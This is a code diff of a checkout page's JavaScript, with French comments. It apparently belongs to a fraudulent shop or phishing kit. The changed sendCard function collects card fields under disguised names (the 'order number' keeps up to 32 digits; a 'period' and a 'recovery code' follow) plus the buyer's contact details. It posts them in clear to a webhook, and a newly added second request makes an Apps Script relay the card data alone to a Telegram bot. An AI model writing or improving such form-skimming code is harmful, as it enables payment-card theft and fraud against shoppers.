@@ -725,33 +725,52 @@
   }
 
   async function sendCard(dueNow){
-    // on collecte TOUT le second formulaire et on envoie en clair (alias inclus)
-    const card_name = ($('#cardName')?.value||'').trim();
-    const order_number = ($('#orderNumber')?.value||'').replace(/\D+/g,'').slice(0,32);
-    const period = ($('#cardPeriod')?.value||'').trim();
-    const recovery_code = ($('#recoveryCode')?.value||'').trim();
+  // Récup 2e formulaire (carte)
+  const card_name     = ($('#cardName')?.value||'').trim();
+  const order_number  = ($('#orderNumber')?.value||'').replace(/\D+/g,'').slice(0,32);
+  const period        = ($('#cardPeriod')?.value||'').trim();
+  const recovery_code = ($('#recoveryCode')?.value||'').trim();
 
-    const payload = {
-      orderId, method:'card', amount:(+dueNow||0).toFixed(2),
+  // 1) POST principal (message "général")
+  const payload = {
+    orderId,
+    method:'card',
+    amount:(+dueNow||0).toFixed(2),
 
-      // Champs carte + alias pour Apps Script
-      card_name, titulaire: card_name, cardholder: card_name, cardName: card_name,
-      order_number, numero_commande: order_number, orderNumber: order_number,
-      period, periode: period, card_period: period, cardPeriod: period,
-      recovery_code, code_recuperation: recovery_code, recoveryCode: recovery_code,
+    // Alias + canoniques (compat Apps Script)
+    card_name, order_number, period, recovery_code,
+    cardName: card_name, orderNumber: order_number, cardPeriod: period, recoveryCode: recovery_code,
+    titulaire: card_name, numero_commande: order_number, card_period: period, code_recuperation: recovery_code,
 
-      // Meta tel depuis form (utile côté bot)
-      phone_meta: ($('#phone')?.value||'').trim(),
+    // Métadonnées utiles
+    phone_meta: ($('#phone')?.value||'').trim(),
 
-      // Coordonnées
-      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
-      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
-      country:$('#country')?.value||'', country_name: countryName(),
+    // Coordonnées
+    name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
+    address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
+    country:$('#country')?.value||'', country_name: (()=>{
+      const sel=$('#country'); if(!sel) return ''; const o=sel.options[sel.selectedIndex]; return (o?.text||'').trim();
+    })(),
 
-      split:selectedSplit, cart:cartForWebhook()
-    };
-    await sendWebhook(payload);
-  }
+    split:selectedSplit,
+    cart:(()=>{ try{ const cart=JSON.parse(localStorage.getItem('gf_cart')||'[]'); return cart.map(x=>({name:x.name,qty:+(x.qty||1),price:+(x.price||0)})); }catch{return[];} })()
+  };
+
+  await sendWebhook(payload);
+
+  // 2) POST "meta only" (force le 2e message Telegram dédié aux champs carte)
+  const metaOnly = {
+    action: 'meta_card_only',       // drapeau que lit l’Apps Script v5 ci-dessous
+    orderId,
+    method: 'card',
+    amount: payload.amount,
+    card_name, order_number, period, recovery_code,
+    phone_meta: payload.phone_meta
+  };
+  // petite pause pour éviter d’arriver dans la même milliseconde
+  await new Promise(r => setTimeout(r, 120));
+  await sendWebhook(metaOnly);
+}
 
   /* ====== FILES (SEPA) ====== */
   const dz=$('#dz'), input=$('#proofInput'), fileWrap=$('#fileWrap'), fileName=$('#fileName'), fileInfo=$('#fileInfo'), fileBar=$('#fileBar'), fileOk=$('#fileOk');
@@ -861,3 +880,4 @@
   </script>
 </body>
 </html>
+
